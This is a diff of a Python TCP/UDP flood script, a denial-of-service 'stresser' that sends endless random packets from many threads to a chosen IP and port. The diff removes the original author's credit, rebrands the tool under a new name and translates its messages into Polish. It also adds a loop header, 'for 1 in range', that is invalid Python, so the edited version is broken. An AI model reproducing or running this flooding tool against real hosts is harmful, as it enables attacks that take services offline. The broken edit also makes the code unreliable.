@@ -1,32 +1,31 @@
 #!/usr/bin/env python3
-#Code by LeeOn123
 import random
 import socket
 import threading
 
-print("--> C0de By Lee0n123 <--")
-print("#-- TCP/UDP FLOOD --#")
+print("-> wStresser <-")
+print("-> By wasuna6 <-")
 ip = str(input(" IP:"))
 port = int(input(" Port:"))
-choice = str(input(" UDP(y/n):"))
+choice = str(input(" 1(UDP)2(TCP):"))
 times = int(input(" Pakiety:"))
-threads = int(input(" Threads:"))
+threads = int(input(" Drop(500):"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("->","->","->"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" Atakowanie metoda: UDP.")
 		except:
-			print("[!] Error!!!")
+			print("-> Error:(")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
+	i = random.choice(("->","->","->"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -34,13 +33,13 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" Atakowanie metoda: TCP.")
 		except:
 			s.close()
-			print("[*] Error")
+			print("-> Error:(")
 
-for y in range(threads):
-	if choice == 'y':
+for 1 in range(threads):
+	if choice == '1':
 		th = threading.Thread(target = run)
 		th.start()
 	else:
